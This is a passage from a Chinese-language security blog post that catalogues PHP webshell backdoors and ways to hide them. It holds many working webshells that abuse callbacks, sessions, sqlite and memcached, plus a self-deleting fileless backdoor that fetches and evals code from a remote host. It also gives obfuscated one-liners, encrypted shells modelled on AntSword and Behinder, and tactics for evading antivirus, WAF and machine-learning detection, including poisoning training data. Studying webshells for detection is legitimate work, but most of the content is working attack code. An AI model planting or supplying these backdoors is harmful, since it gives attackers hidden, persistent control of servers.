    $session &#x3D; chr(97) . chr(115) . chr(115) . chr(101) . chr(114) . chr(116); &#x2F;&#x2F;assert
    &#x2F;&#x2F; open第一个被调用，类似类的构造函数
    function open($save_path, $session_name) 
    &#123;&#125;
    &#x2F;&#x2F; close最后一个被调用，类似 类的析构函数
    function close() 
    &#123;
    &#125;
    &#x2F;&#x2F; 执行session_id($_REQUEST[&#39;op&#39;])后，PHP自动会进行read操作，因为我们为read callback赋值了assert操作，等价于执行assert($_REQUEST[&#39;op&#39;])
    session_id($_REQUEST[&#39;op&#39;]);
    function write($id, $sess_data) 
    &#123;&#125;
    function destroy($id) 
    &#123;&#125;
    function gc() 
    &#123;&#125;
    &#x2F;&#x2F; 第三个参数为read  read(string $sessionId)
    session_set_save_handler(&quot;open&quot;, &quot;close&quot;, $session, &quot;write&quot;, &quot;destroy&quot;, &quot;gc&quot;);
    @session_start(); &#x2F;&#x2F; 打开会话
    $cloud &#x3D; $_SESSION[&quot;d&quot;] &#x3D; &quot;c&quot;;  
?&gt;</code></pre>

<h3 id="28-利用include、pack隐藏webshell"><a href="#28-利用include、pack隐藏webshell" class="headerlink" title="28. 利用include、pack隐藏webshell"></a>28. 利用include、pack隐藏webshell</h3><p>利用PHP的include可以引入外部代码的特性，实现WEBSHELL代码的隐藏</p>
<pre class="language-none"><code class="language-none">&lt;?php
    echo bin2hex(&quot;&lt;?php echo hello; ?&gt;&quot;);
?&gt;

&lt;?php 
    @include(pack(&quot;H*&quot;, &quot;3c3f706870206563686f2068656c6c6f3b203f3e&quot;));  
?&gt;</code></pre>

<h3 id="29-临时文件-include"><a href="#29-临时文件-include" class="headerlink" title="29. 临时文件 + include"></a>29. 临时文件 + include</h3><p>通过将恶意代码写入临时磁盘文件，然后include进当前代码空间进行执行，运行之后删除临时文件；通过写磁盘文件进行一次”中转”，是因为php不允许直接include一段字符串，但是允许一个包含php代码的文件</p>
<pre class="language-none"><code class="language-none">&lt;?php

    $cfg_ml&#x3D;&#39;PD9waHAgQGV2YWwoJF9QT1NUWydndWlnZSddKT8+&#39;;
    &#x2F;&#x2F;&lt;?php @eval($_POST[&#39;guige&#39;])?&gt;

    $cfg_ml &#x3D; base64_decode($cfg_ml);
    $t &#x3D; md5(mt_rand(1,100));
    &#x2F;&#x2F;尝试向各种可能的目录下写入临时WEBSHELL文件
    $f&#x3D;$_SERVER[&#39;DOCUMENT_ROOT&#39;].&#39;&#x2F;data&#x2F;sessions&#x2F;sess_&#39;.$t;
    @file_put_contents($f,$cfg_ml);
    if(!file_exists($f))
    &#123;    
        $f&#x3D;$t;
        @file_put_contents($f,$cfg_ml);
    &#125;
    if(!file_exists($f))
    &#123;
        $f&#x3D;$_SERVER[&#39;DOCUMENT_ROOT&#39;].&#39;&#x2F;a&#x2F;&#39;.$t;
        @file_put_contents($f,$cfg_ml);
    &#125;
    if(!file_exists($f))
    &#123;
        &#x2F;&#x2F;向脚本所在当前目录下写入临时WEBSHELL文件
        $f&#x3D;$_SERVER[&#39;DOCUMENT_ROOT&#39;].&#39;&#x2F;&#39;.$t;
        @file_put_contents($f,$cfg_ml);
    &#125;
    if(!file_exists($f))
    &#123;
        $f&#x3D;&#39;&#x2F;tmp&#x2F;&#39;.$t;
        @file_put_contents($f,$cfg_ml);
    &#125; 
    &#x2F;&#x2F;通过include引入之前写入的临时WEBSHELL文件
    @include($f);
    @unlink($f);  

?&gt;</code></pre>

<h3 id="30-利用filter-var-callback特性"><a href="#30-利用filter-var-callback特性" class="headerlink" title="30. 利用filter_var callback特性"></a>30. 利用filter_var callback特性</h3><p>利用filter_var，php里用这个函数来过滤数组，只要指定过滤方法为回调（FILTER_CALLBACK），且option为assert即可</p>
<pre class="language-none"><code class="language-none">&lt;?php
    filter_var($_REQUEST[&#39;op&#39;], FILTER_CALLBACK, array(&#39;options&#39; &#x3D;&gt; &#39;assert&#39;));
?&gt;</code></pre>

<h3 id="31-数据库回调后门"><a href="#31-数据库回调后门" class="headerlink" title="31. 数据库回调后门"></a>31. 数据库回调后门</h3><p>注册一个sqlite函数，使之与assert功能相同。当执行这个sql语句的时候，就等于执行了assert</p>
<pre class="language-none"><code class="language-none">&lt;?php
  $e &#x3D; $_REQUEST[&#39;e&#39;];
  $db &#x3D; new PDO(&#39;sqlite:sqlite.db3&#39;);
  $db-&gt;sqliteCreateFunction(&#39;myfunc&#39;, $e, 1);
  $sth &#x3D; $db-&gt;prepare(&quot;SELECT myfunc(:exec)&quot;);
  $sth-&gt;execute(array(&#39;:exec&#39; &#x3D;&gt; $_REQUEST[&#39;pass&#39;]));
?&gt;</code></pre>

<h3 id="32-利用php-memcached执行webshell"><a href="#32-利用php-memcached执行webshell" class="headerlink" title="32. 利用php_memcached执行webshell"></a>32. 利用php_memcached执行webshell</h3><pre class="language-none"><code class="language-none">&lt;?php
  $mem &#x3D; new Memcache();
  $re &#x3D; $mem-&gt;addServer(&#39;localhost&#39;, 11211, TRUE, 100, 0, -1, TRUE, create_function(&#39;$a,$b,$c,$d,$e&#39;, &#39;return assert($a);&#39;));
  $mem-&gt;connect($_REQUEST[&#39;op&#39;], 11211, 0);
?&gt;</code></pre>

<h3 id="33-利用preg-replace-callback隐藏webshell"><a href="#33-利用preg-replace-callback隐藏webshell" class="headerlink" title="33. 利用preg_replace_callback隐藏webshell"></a>33. 利用preg_replace_callback隐藏webshell</h3><pre class="language-none"><code class="language-none">&lt;?php
  preg_replace_callback(&#39;&#x2F;.+&#x2F;i&#39;, create_function(&#39;$arr&#39;, &#39;return assert($arr[0]);&#39;),$_REQUEST[&#39;op&#39;]);
?&gt;

或

&lt;?php
  mb_ereg_replace_callback(&#39;.+&#39;, create_function(&#39;$arr&#39;, &#39;return assert($arr[0]);&#39;),$_REQUEST[&#39;op&#39;]);
?&gt;</code></pre>

<h3 id="34-利用CallbackFilterIterator部署回调后门"><a href="#34-利用CallbackFilterIterator部署回调后门" class="headerlink" title="34. 利用CallbackFilterIterator部署回调后门"></a>34. 利用CallbackFilterIterator部署回调后门</h3><pre class="language-none"><code class="language-none">&lt;?php
  $iterator &#x3D; new CallbackFilterIterator(new ArrayIterator(array($_REQUEST[&#39;op&#39;],)), create_function(&#39;$a&#39;, &#39;assert($a);&#39;));
  foreach ($iterator as $item) 
  &#123;
    echo $item;
  &#125;
?&gt;</code></pre>

<h3 id="35-PHP无文件后门"><a href="#35-PHP无文件后门" class="headerlink" title="35. PHP无文件后门"></a>35. PHP无文件后门</h3><pre class="language-none"><code class="language-none">&lt;?php
unlink($_SERVER[&#39;SCRIPT_FILENAME&#39;]);
ignore_user_abort(true);
set_time_limit(0);

$remote_file &#x3D; &#39;http:&#x2F;&#x2F;xsser.me&#x2F;eval.txt&#39;;
while($code &#x3D; file_get_contents($remote_file))&#123;
  @eval($code);
  sleep(5);
&#125;;
?&gt;</code></pre>

<h2 id="0x05-绕过姿势"><a href="#0x05-绕过姿势" class="headerlink" title="0x05 绕过姿势"></a>0x05 绕过姿势</h2><h3 id="1-绕过静态检测"><a href="#1-绕过静态检测" class="headerlink" title="1. 绕过静态检测"></a>1. 绕过静态检测</h3><h4 id="a-字符串处理"><a href="#a-字符串处理" class="headerlink" title="a. 字符串处理"></a>a. 字符串处理</h4><pre class="language-none"><code class="language-none">1) 字符串变形

利用各种字符串处理函数将一些可能被杀软识别的关键字变形，绕过正则匹配

常见处理函数：

   ucwords() &#x2F;&#x2F;函数把字符串中每个单词的首字符转换为大写 
   ucfirst() &#x2F;&#x2F;函数把字符串中的首字符转换为大写 
   trim() &#x2F;&#x2F;函数从字符串的两端删除空白字符和其他预定义字符 
   substr_replace() &#x2F;&#x2F;函数把字符串的一部分替换为另一个字符串 
   substr() &#x2F;&#x2F;函数返回字符串的一部分 
   strtr() &#x2F;&#x2F;函数转换字符串中特定的字符 
   strtoupper() &#x2F;&#x2F;函数把字符串转换为大写 
   strtolower() &#x2F;&#x2F;函数把字符串转换为小写 
   strtok() &#x2F;&#x2F;函数把字符串分割为更小的字符串 
   str_rot13() &#x2F;&#x2F;函数对字符串执行 ROT13 编码

   &#x2F;&#x2F; 替换
   &lt;?php
   $x&#x3D;&#39;$_PO&#39;.&quot;STasdasd[&quot;.&#39;1]&#39;;
   $x &#x3D; $x.str_replace(&#39;STasdasd&#39;,&quot;ST[&quot;);
   for ($x&#x3D;0; $x&lt;&#x3D;0; $x++) &#123;
       assert(&quot;$x&quot;);
   &#125;

   &#x2F;&#x2F; str_rot13
   preg_replace(&quot;&#x2F;[errorpage]&#x2F;e&quot;, @str_rot13(&#39;@nffreg($_CBFG[cntr]);&#39;), &quot;saft&quot;);

2）字符串拼接

用字符串拼接的方式来分割危险关键字

   &#x2F;&#x2F; 利用可变函数调用
   $k&#x3D;&quot;ass&quot;.&quot;ert&quot;; $k($&#123;&quot;_PO&quot;.&quot;ST&quot;&#125; [&#39;pass&#39;]);

   &#x2F;&#x2F; 利用注释
   @$_&#x3D;&quot;s&quot;.&quot;s&quot;.&#x2F;*-&#x2F;*-*&#x2F;&quot;e&quot;.&#x2F;*-&#x2F;*-*&#x2F;&quot;r&quot;; @$_&#x3D;&#x2F;*-&#x2F;*-*&#x2F;&quot;a&quot;.&#x2F;*-&#x2F;*-*&#x2F;$_.&#x2F;*-&#x2F;*-*&#x2F;&quot;t&quot;; @$_&#x2F;*-&#x2F;*-*&#x2F;($&#x2F;*-&#x2F;*-*&#x2F;&#123;&quot;_P&quot;.&#x2F;*-&#x2F;*-*&#x2F;&quot;OS&quot;.&#x2F;*-&#x2F;*-*&#x2F;&quot;T&quot;&#125; [&#x2F;*-&#x2F;*-*&#x2F;0&#x2F;*-&#x2F;*-*&#x2F;-&#x2F;*-&#x2F;*-*&#x2F;2&#x2F;*-&#x2F;*-*&#x2F;-&#x2F;*-&#x2F;*-*&#x2F;5&#x2F;*-&#x2F;*-*&#x2F;]); &#x2F;&#x2F; 密码-7 

   &#x2F;&#x2F; 变形加拼接
   $_uU&#x3D;chr(99).chr(104).chr(114);$_cC&#x3D;$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF&#x3D;$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111). $_uU(110); $_&#x3D;$_fF(&quot;&quot;,$_cC); @$_();

3）字符串运算

&#x2F;&#x2F; 异或取反运算
@$_++; $__&#x3D;(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;&#x2F;&quot;^&quot;&#96;&quot;).(&quot;|&quot;^&quot;&#x2F;&quot;).(&quot;&#123;&quot;^&quot;&#x2F;&quot;);         &#x2F;&#x2F; $__的值为_POST @$&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]);

$a&#x3D;&#39;999999999999999999999999&#39;^urldecode(&#39;%5COXU%11%1DfivjmbXXXd%10%02&#39;); eval(&#x2F;*echo*&#x2F;($a));  &#x2F;&#x2F;password&#x3D;aaa

&#x2F;&#x2F; 自增运算

$_&#x3D;[]; $_&#x3D;@&quot;$_&quot;; &#x2F;&#x2F; $_&#x3D;&#39;Array&#39;; $_&#x3D;$_[&#39;!&#39;&#x3D;&#x3D;&#39;@&#39;]; &#x2F;&#x2F; $_&#x3D;$_[0]; $___&#x3D;$_; &#x2F;&#x2F; A $__&#x3D;$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $___.&#x3D;$__; &#x2F;&#x2F; S $___.&#x3D;$__; &#x2F;&#x2F; S $__&#x3D;$_; $__++;$__++;$__++;$__++; &#x2F;&#x2F; E  $___.&#x3D;$__; $__&#x3D;$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; R $___.&#x3D;$__; $__&#x3D;$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T $___.&#x3D;$__; $____&#x3D;&#39;_&#39;; $__&#x3D;$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; P $____.&#x3D;$__; $__&#x3D;$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; O $____.&#x3D;$__; $__&#x3D;$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; S $____.&#x3D;$__; $__&#x3D;$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T $____.&#x3D;$__; $_&#x3D;$$____; $___(base64_decode($_[_])); &#x2F;&#x2F; ASSERT($_POST[_]); 

&#x2F;&#x2F; 异或运算

$b&#x3D;~urldecode(&#39;%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%C4&#39;); $a&#x3D;$b; eval(&#x2F;*echo*&#x2F;($a));  &#x2F;&#x2F;password&#x3D;a，~的主要作用为取反，生成的不可见字符可以使用URL编码保存

4）进制转换

&#x2F;&#x2F; 通过十六进制和八进制混用的方式代替base64_decode，常见的编码方式base64, chr, rot13, gzip, zlib等

$v230c590&#x3D;&quot;x62x61163x65x36x34137144145x63x6f144145&quot;; @eval($v230c590(.....</code></pre>

<h4 id="b-关键词处理"><a href="#b-关键词处理" class="headerlink" title="b. 关键词处理"></a>b. 关键词处理</h4><pre class="language-none"><code class="language-none">1）使用全局变量绕过$_POST检查

    @eval($GLOBALS[&#39;_POST&#39;][&#39;pass&#39;]);

2）利用$_FILE

    @eval($_FILE[&#39;name&#39;]);

3）利用文件名

    $&#123;&quot;function&quot;&#125;&#x3D;substr(__FILE__,-10,-4);; $&#123;&quot;command&quot;&#125;&#x3D;$_POST[cmd]; $function($command);</code></pre>

<h4 id="c-数组利用"><a href="#c-数组利用" class="headerlink" title="c. 数组利用"></a>c. 数组利用</h4><p>将循环的变量事先进行定义，可以降低查杀率</p>
<pre class="language-none"><code class="language-none">1）通过定义数组，再交给 eval 等处理

$array &#x3D; array(     233   &#x3D;&gt; false,     42    &#x3D;&gt; $_GET[&#39;SECQUAN&#39;], ); eval($array[233].$array[42]); ?&gt; 

2）利用substr 和 explode 在字符串和数组之间处理

error_reporting(0); $sss&#x3D;&#39;&#39;; $s&#x3D;&#39;&#39;; $s&#x3D;&#39;123456eval(123456$_POST123456[&quot;1&quot;]);123456&#39;; $ss&#x3D;array().explode(&quot;123456&quot;,$s)[1].explode(&quot;123456&quot;,$s)[2].explode(&quot;123456&quot;,$s)[3]; $sss&#x3D;substr($ss,5,100); eval($sss);

3）多维数组

$b &#x3D; substr_replace(&quot;assexx&quot;,&quot;rt&quot;,4);
$a &#x3D; array($arrayName &#x3D; array(&#39;a&#39; &#x3D;&gt; $b($_POST[&#39;q&#39;])));</code></pre>

<h4 id="d-函数利用"><a href="#d-函数利用" class="headerlink" title="d. 函数利用"></a>d. 函数利用</h4><pre class="language-none"><code class="language-none">1）将取值赋值放入自定义函数

function a()&#123;
     return $a&#x3D;$_POST[&#39;1&#39;];
&#125;
@assert(a());

2）结合可变函数

function func() &#123;     return &quot;ass&quot;.&quot;ert&quot;; &#125; $a &#x3D; func(); $a($&#123;&quot;_PO&quot;.&quot;ST&quot;&#125;[&#39;sz&#39;]);

3）自定义字符串转换函数


$string&#x3D;&#39;&#39;;
$password&#x3D;&#39;test&#39;;
if(isset($_POST[$password]))&#123;
     $hex&#x3D;$_POST[$password];
     for($i&#x3D;0;$i&lt;strlen($hex)-1;$i+&#x3D;2)&#123;
     $string.&#x3D;chr(hexdec($hex[$i].$hex[$i+1]));
&#125;
@eval($string);

4）匿名函数

function __lambda_func()&#123;@eval($_POST[&#39;f&#39;]);&#125; $s &#x3D; &quot;F9QivT1NUWyd&quot;; $v &#x3D; &quot;QGivV2YivWwoJ&quot;; $j &#x3D; &quot;mJ10pOw&#x3D;iv&#x3D;&quot;; $re &#x3D; str_replace(&quot;iv&quot;, &quot;&quot;, &quot;sivtr_ivrepivlaivce&quot;); $ba &#x3D; $re(&quot;nf&quot;, &quot;&quot;, &quot;bnfanfse6nf4_nfdecnfode&quot;); $fun &#x3D; $re(&quot;vf&quot;, &quot;&quot;, &quot;cvfreavfte_fvfunctvfion&quot;); $vi &#x3D; $fun(&quot;&quot;, $ba($re(&quot;iv&quot;, &quot;&quot;, $v . $s . $j))); $vi();</code></pre>

<h4 id="e-类调用"><a href="#e-类调用" class="headerlink" title="e. 类调用"></a>e. 类调用</h4><p>使用类进行调用，会绕过部分静态检测手段</p>
<pre class="language-none"><code class="language-none">class get&#123;
     public function setName($name&#x3D;1)&#123;
         return $this -&gt; name &#x3D; $name;
     &#125;
&#125;
$obj &#x3D; new get();
$s &#x3D; $obj -&gt; setName(&quot;$_POST[1]&quot;);
eval(null.$s);</code></pre>

<p>使用接口继承</p>
<pre class="language-none"><code class="language-none">
interface lbw&#123;
     public function getshell($name);
&#125;
class Demo implements lbw &#123;
     public $demo&#x3D;&#39;s&#39;;
     public function getshell($name)
&#123;
         echo eval($name);
     &#125;
&#125;
$obj&#x3D;new Demo();
$obj-&gt;getshell($_GET[&#39;a&#39;]);</code></pre>

<p>针对回调函数，写在__construct&#x2F;__destruct 方法中</p>
<pre class="language-none"><code class="language-none">
$class &#x3D; new ReflectionClass(&#39;filter&#39;);
$instance &#x3D; $class-&gt;newInstance($_GET);
unset($instance);
class filter &#123;
     private $password &#x3D; &#39;password&#39;;
     public function __construct(array $data)&#123;
         $this-&gt;data &#x3D; $data;
     &#125;
     public function __destruct()&#123;
         if (array_key_exists($this-&gt;password, $this-&gt;data) &amp;&amp; !empty($this-&gt;data[$this-&gt;password])) &#123;
             eval($this-&gt;data[$this-&gt;password]);
         &#125;
     &#125;
&#125;</code></pre>

<h4 id="f-文件混淆加密"><a href="#f-文件混淆加密" class="headerlink" title="f. 文件混淆加密"></a>f. 文件混淆加密</h4><p>文件加密后无法被各种检测软件的文件解析模块解析，绕过静态检测</p>
<h3 id="2-绕过流量检测"><a href="#2-绕过流量检测" class="headerlink" title="2. 绕过流量检测"></a>2. 绕过流量检测</h3><p>在双端进行非对称加解密操作，绕过WAF检测，要在双端加密，不管是请求包还是响应包，都是密文，双端都有加解密的操作</p>
<h4 id="a-RSA加密"><a href="#a-RSA加密" class="headerlink" title="a. RSA加密"></a>a. RSA加密</h4><p>使用 RSA 进行加密（蚁剑 php shell）</p>
<pre class="language-none"><code class="language-none">$cmd &#x3D; @$_POST[&#39;ant&#39;];
$publicKey &#x3D; &lt;&lt;&lt;EOF
-----BEGIN PUBLIC KEY-----
 Input your Public Key 
-----END PUBLIC KEY----- 
EOF; 
$cmds &#x3D; explode(&quot;|&quot;, $cmd);
$publicKey &#x3D; openssl_pkey_get_public($publicKey);
$cmd &#x3D; &#39;&#39;;
foreach ($cmds as $value) &#123;
     if (openssl_public_decrypt(base64_decode($value), $de, $publicKey)) &#123;
         $cmd .&#x3D; $de;
     &#125;
&#125;
eval($cmd);</code></pre>

<h4 id="b-AES加密"><a href="#b-AES加密" class="headerlink" title="b. AES加密"></a>b. AES加密</h4><p>使用AES加密（冰蝎 php shell）</p>
<pre class="language-none"><code class="language-none">@error_reporting(0);
session_start();
if (isset($_GET[&#39;pass&#39;])) &#123;
     $key&#x3D;substr(md5(uniqid(rand())),16);
     $_SESSION[&#39;k&#39;]&#x3D;$key;
     print $key; 
&#125; else &#123;
     $key&#x3D;$_SESSION[&#39;k&#39;];
     $post&#x3D;file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);                
if(!extension_loaded(&#39;openssl&#39;)) &#123; $t&#x3D;&quot;base64_&quot;.&quot;decode&quot;; $post&#x3D;$t($post.&quot;&quot;); for($i&#x3D;0;$i&lt;strlen($post);$i++) &#123;       $post[$i] &#x3D; $post[$i]^$key[$i+1&amp;15];       &#125; &#125; else &#123; $post&#x3D;openssl_decrypt($post, &quot;AES128&quot;, $key); &#125;     $arr&#x3D;explode(&#39;|&#39;,$post);     $func&#x3D;$arr[0];     $params&#x3D;$arr[1]; class C&#123;public function __construct($p) &#123;eval($p.&quot;&quot;);&#125;&#125; @new C($params); &#125;</code></pre>

<h3 id="3-绕过机器学习算法检测"><a href="#3-绕过机器学习算法检测" class="headerlink" title="3. 绕过机器学习算法检测"></a>3. 绕过机器学习算法检测</h3><p>使用分类算法、神经网络、深度学习、异常检测算法，常用思路如下：</p>
<ul>
<li><p>收集webshell作为训练样本，训练好的模型进行分类，本质上是黑名单训练，典型的如One Class SVM</p>
</li>
<li><p>有针对性的收集正常PHP业务逻辑代码和流量，进行白名单训练</p>
</li>
<li><p>挖掘各项特征，完全进行聚类算法</p>
</li>
<li><p>基于统计学，构建概率分布模型</p>
</li>
<li><p>使用孤立森林等算法进行无监督的异常检测</p>
</li>
<li><p>结合威胁情报、黑客画像、攻击手法等，扩展特征维度，弱化代码、流量本身的权重占比</p>
</li>
</ul>
<h4 id="a-加密文件"><a href="#a-加密文件" class="headerlink" title="a. 加密文件"></a>a. 加密文件</h4><p>对文件加密后，机器学习算法的识别就产生了巨大的偏差，在某些黑名单算法下无法有效识别，但容易被静态检测检出</p>
<h4 id="b-模拟正常业务代码逻辑"><a href="#b-模拟正常业务代码逻辑" class="headerlink" title="b. 模拟正常业务代码逻辑"></a>b. 模拟正常业务代码逻辑</h4><ul>
<li><p>对于流量层面，模拟其他正常业务逻辑的传参方式，必要时完全模拟其他参数的传递，这样可以也可以污染一些机器学习模型动态学习时的训练数据</p>
</li>
<li><p>使用类、函数进行webshell编写，增加代码互相调用的复杂度</p>
</li>
<li><p>避免使用常见的webshell中常用的一些字符处理函数，避免某些关键字在训练模型中出现频率较高导致报警</p>
</li>
</ul>
<h4 id="c-匿名化攻击"><a href="#c-匿名化攻击" class="headerlink" title="c. 匿名化攻击"></a>c. 匿名化攻击</h4><p>使用白IP进行攻击探测，使用代理池分散恶意流量，在正常业务访问时间进行探测，降低其他维度对攻击行为的标签，来绕过多维度特征的机器学习算法的检测</p>
<h4 id="d-使用注释"><a href="#d-使用注释" class="headerlink" title="d. 使用注释"></a>d. 使用注释</h4><p>使用注释进行PHP的混淆，可绕过检测源码的机器学习算法</p>
<h2 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF Reference"></a>0xFF Reference</h2><ul>
<li><p><a target="_blank" rel="noopener" href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/Webshell-Part1&amp;Part2.html">https://wooyun.js.org/drops/Webshell-Part1&amp;Part2.html</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://lcx.cc/post/3188/">https://lcx.cc/post/3188/</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LittleHann/p/3522990.html">https://www.cnblogs.com/LittleHann/p/3522990.html</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html">https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/dynamic-features-and-webshell-tricks-in-php.html">https://www.leavesongs.com/PENETRATION/dynamic-features-and-webshell-tricks-in-php.html</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/web-shells-penetration-testing/">https://www.hackingarticles.in/web-shells-penetration-testing/</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://blog.sucuri.net/2013/07/malware-hidden-inside-jpg-exif-headers.html">https://blog.sucuri.net/2013/07/malware-hidden-inside-jpg-exif-headers.html</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet">https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.acunetix.com/blog/articles/keeping-web-shells-undercover-an-introduction-to-web-shells-part-3/">https://www.acunetix.com/blog/articles/keeping-web-shells-undercover-an-introduction-to-web-shells-part-3/</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2335">https://xz.aliyun.com/t/2335</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/PO6khkGHWKd9_EzZocXGaA">https://mp.weixin.qq.com/s/PO6khkGHWKd9_EzZocXGaA</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/lExi2_y4NkTak735kpz4ug">https://mp.weixin.qq.com/s/lExi2_y4NkTak735kpz4ug</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.exif-read-data.php">https://www.php.net/manual/zh/function.exif-read-data.php</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/epinna/weevely3">https://github.com/epinna/weevely3</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a></p>
</li>
</ul>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Malware/" rel="tag" <i class="fa fa-tag"></i> Malware</a>
              <a href="/tags/Webshell/" rel="tag" <i class="fa fa-tag"></i> Webshell</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/posts/18896/" rel="prev" title="Linux Rootkit技术研究">
                  <i class="fa fa-chevron-left"></i> Linux Rootkit技术研究
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/posts/20801/" rel="next" title="Docker攻击面探究">
                  Docker攻击面探究 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">L0n9w4y</span>
</div>

    </div>
  </footer>

  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  




  <script src="/js/third-party/pace.js"></script>

  





</body>
</html>
